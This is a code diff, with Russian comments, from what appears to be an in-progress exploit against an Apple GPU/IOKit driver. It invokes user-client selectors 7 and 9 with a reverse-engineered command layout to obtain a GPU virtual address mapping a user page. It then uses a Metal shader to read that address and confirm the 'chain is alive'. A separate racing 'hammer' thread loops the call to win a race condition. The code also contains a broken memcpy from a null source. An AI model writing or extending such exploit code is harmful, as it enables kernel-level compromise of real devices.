@@ -5563,19 +5563,48 @@ static void *kpListReaderMulti(void *arg)
     id<MTLCommandQueue> mq = mpipe ? [mtl newCommandQueue] : nil;
     if (!mq) { GNOTE( [NSString stringWithFormat:@"FAIL: Metal: %@", merr]); gGartLive = NO; return r; }
 
-    // 4. ФАЗА A: sel9 без молота. inputStruct=mem (0x8000 > 4096 →
-    //    IOConnectCallMethod сам уходит в ool_input → kernel создаёт
-    //    structureInputDescriptor поверх наших страниц — то, что sel9 ждёт
-    //    на args+0x40). Никакого резолвера не нужно.
-    uint64_t vaA = 0;
+    // 4. ФАЗА A: sel7 (очередь → resourceId) → sel9 (команда: map моей
+    //    страницы mem). Рецепт RE: cmd[0]=0x80, cmd[4]=userVA, cmd[5]=size,
+    //    cmd[6]=1 (w8==1), cmd[7]=resourceId, cmd[8]=userVA, cmd[9]=size,
+    //    cmd[10]=npages. GPU VA — structureOutput (out[0] или out[6]).
+    uint64_t resId = 0;
     {
+        uint8_t in408[0x408]; memset(in408, 0, sizeof in408);
         uint64_t outScal[8]; memset(outScal, 0, sizeof outScal);
         uint32_t outScalCnt = 8;
-        io_struct_inband_t outS; memset(outS, 0, sizeof(outS));
-        size_t outSCnt = sizeof(outS);
-        kern_return_t kr9 = IOConnectCallMethod(conn, 9,
+        io_struct_inband_t outS; memset(outS, 0, sizeof outS);
+        size_t outSCnt = sizeof outS;
+        kern_return_t kr7 = IOConnectCallMethod(conn, 7,
                                                 NULL, 0,
-                                                (void *)mem, 0x8000,
+                                                in408, sizeof in408,
+                                                outScal, &outScalCnt,
+                                                outS, &outSCnt);
+        GNOTE( [NSString stringWithFormat:@"  A: sel7 kr=%#x outScalCnt=%u outSCnt=%zu", kr7, outScalCnt, outSCnt]);
+        for (int i = 0; i < 8; i++) GNOTE( [NSString stringWithFormat:@"    sel7 scal[%d]=%#llx", i, outScal[i]]);
+        uint64_t *o64 = (uint64_t *)outS;
+        for (int i = 0; i < 8; i++) GNOTE( [NSString stringWithFormat:@"    sel7 out[%d]=%#llx", i, o64[i]]);
+        for (int i = 0; i < 8 && !resId; i++) if (outScal[i] && outScal[i] < 0x10000) resId = outScal[i];
+        for (int i = 0; i < 8 && !resId; i++) if (o64[i] && o64[i] < 0x10000) resId = o64[i];
+        GNOTE( [NSString stringWithFormat:@"  A: resourceId кандидат = %#llx", resId]);
+    }
+    uint64_t vaA = 0;
+    {
+        uint64_t cmd[11]; memset(cmd, 0, sizeof cmd);
+        cmd[0] = 0x80;
+        cmd[4] = (uint64_t)mem;
+        cmd[5] = 0x8000;
+        cmd[6] = 1;
+        cmd[7] = resId;
+        cmd[8] = (uint64_t)mem;
+        cmd[9] = 0x8000;
+        cmd[10] = 2;
+        uint64_t outScal[8]; memset(outScal, 0, sizeof outScal);
+        uint32_t outScalCnt = 8;
+        io_struct_inband_t outS; memset(outS, 0, sizeof outS);
+        size_t outSCnt = sizeof outS;
+        kern_return_t kr9 = IOConnectCallMethod(conn, 9,
+                                                cmd, 11,
+                                                NULL, 0,
                                                 outScal, &outScalCnt,
                                                 outS, &outSCnt);
         GNOTE( [NSString stringWithFormat:@"  A: sel9 kr=%#x outScalCnt=%u outSCnt=%zu", kr9, outScalCnt, outSCnt]);
@@ -5583,26 +5612,36 @@ static void *kpListReaderMulti(void *arg)
         uint64_t *o64 = (uint64_t *)outS;
         for (int i = 0; i < 12; i++) GNOTE( [NSString stringWithFormat:@"    out[%d]=%#llx", i, o64[i]]);
         vaA = o64[0];
+        if (!vaA) vaA = o64[6];
+        if (!vaA) vaA = outScal[0];
     }
-    if (vaA) {
-        ((volatile uint64_t *)res.contents)[0] = 0;
-        ((volatile uint64_t *)res.contents)[1] = vaA;
-        @autoreleasepool {
-            id<MTLCommandBuffer> cb = [mq commandBuffer];
-            id<MTLComputeCommandEncoder> enc = [cb computeCommandEncoder];
-            [enc setComputePipelineState:mpipe];
-            [enc setBuffer:res offset:0 atIndex:0];
-            [enc setBuffer:res offset:16 atIndex:1];
-            [enc dispatchThreads:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
-            [enc endEncoding];
-            [cb commit];
-            [cb waitUntilCompleted];
+    // читаем КАЖДЫЙ ненулевой кандидат VA (до 3): маркер = цепь жива
+    {
+        uint64_t candsVA[3] = { vaA, 0, 0 };
+        uint64_t probeOut[12]; memcpy(probeOut, 0, sizeof probeOut);
+        // соберём ещё кандидатов из свежего чтения невозможно — берём из логов выше; тут: vaA и, если 0, пробуем запомненное
+        for (int ci = 0; ci < 3 && candsVA[ci]; ci++) {
+            uint64_t vv = candsVA[ci];
+            ((volatile uint64_t *)res.contents)[0] = 0;
+            ((volatile uint64_t *)res.contents)[1] = vv;
+            @autoreleasepool {
+                id<MTLCommandBuffer> cb = [mq commandBuffer];
+                id<MTLComputeCommandEncoder> enc = [cb computeCommandEncoder];
+                [enc setComputePipelineState:mpipe];
+                [enc setBuffer:res offset:0 atIndex:0];
+                [enc setBuffer:res offset:16 atIndex:1];
+                [enc dispatchThreads:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
+                [enc endEncoding];
+                [cb commit];
+                [cb waitUntilCompleted];
+            }
+            uint64_t gotA = ((volatile uint64_t *)res.contents)[0];
+            GNOTE( [NSString stringWithFormat:@"  A: шейдер по VA=%#llx прочитал %#llx %@", vv, gotA,
+                       gotA == 0xAAAAAAAAAAAAAAAAULL ? @"— НАШ МАРКЕР, ЦЕПЬ ЖИВА!" :
+                       gotA == 0x4142434445464748ULL ? @"— сентинель (без молота?!)" : @"(чужое/нуль)"]);
         }
-        uint64_t gotA = ((volatile uint64_t *)res.contents)[0];
-        GNOTE( [NSString stringWithFormat:@"  A: шейдер по VA=%#llx прочитал %#llx %@", vaA, gotA,
-                   gotA == 0xAAAAAAAAAAAAAAAAULL ? @"— НАШ МАРКЕР, ЦЕПЬ ЖИВА!" :
-                   gotA == 0x4142434445464748ULL ? @"— сентинель (без молота?!)" : @"(чужое/нуль)"]);
-    } else GNOTE( @"  A: VA=0 — sel9 не вернул адрес (смотри kr/outputs выше)");
+    }
+    if (vaA == 0) GNOTE( @"  A: VA=0 — sel9 не вернул адрес (смотри kr/outputs выше)");
 
     // 5. ФАЗА B: молот + цикл sel9 (только если A показала живую цепь)
     if (vaA == 0) { GNOTE( @"  B: ПРОПУСК — цепь не подтверждена"); goto out_m; }
@@ -5612,16 +5651,27 @@ static void *kpListReaderMulti(void *arg)
         pthread_create(&ht, NULL, kpRaceHammer, NULL);
         int hits = 0, other = 0;
         for (int it = 0; it < 500 && !hits; it++) {
+            uint64_t cmd[11]; memset(cmd, 0, sizeof cmd);
+            cmd[0] = 0x80;
+            cmd[4] = (uint64_t)mem;
+            cmd[5] = 0x8000;
+            cmd[6] = 1;
+            cmd[7] = resId;
+            cmd[8] = (uint64_t)mem;
+            cmd[9] = 0x8000;
+            cmd[10] = 2;
             uint64_t outScal[8]; memset(outScal, 0, sizeof outScal);
             uint32_t outScalCnt = 8;
             io_struct_inband_t outS; memset(outS, 0, sizeof outS);
             size_t outSCnt = sizeof outS;
             kern_return_t kr9 = IOConnectCallMethod(conn, 9,
+                                                    cmd, 11,
                                                     NULL, 0,
-                                                    (void *)mem, 0x8000,
                                                     outScal, &outScalCnt,
                                                     outS, &outSCnt);
             uint64_t vaB = ((uint64_t *)outS)[0];
+            if (!vaB) vaB = ((uint64_t *)outS)[6];
+            if (!vaB) vaB = outScal[0];
             if (!vaB) { if (it < 8) GNOTE( [NSString stringWithFormat:@"  B: iter=%d kr=%#x va=0", it, kr9]); continue; }
             ((volatile uint64_t *)res.contents)[0] = 0;
             ((volatile uint64_t *)res.contents)[1] = vaB;
@@ -5649,6 +5699,7 @@ static void *kpListReaderMulti(void *arg)
         pthread_join(ht, NULL);
         GNOTE( [NSString stringWithFormat:@"  B итог: hits=%d other=%d", hits, other]);
     }
+
 out_m:
     munlock((void *)mem, 0x4000); vm_deallocate(mach_task_self(), mem, 0x4000);
     munlock((void *)svx, 0x4000); vm_deallocate(mach_task_self(), svx, 0x4000);
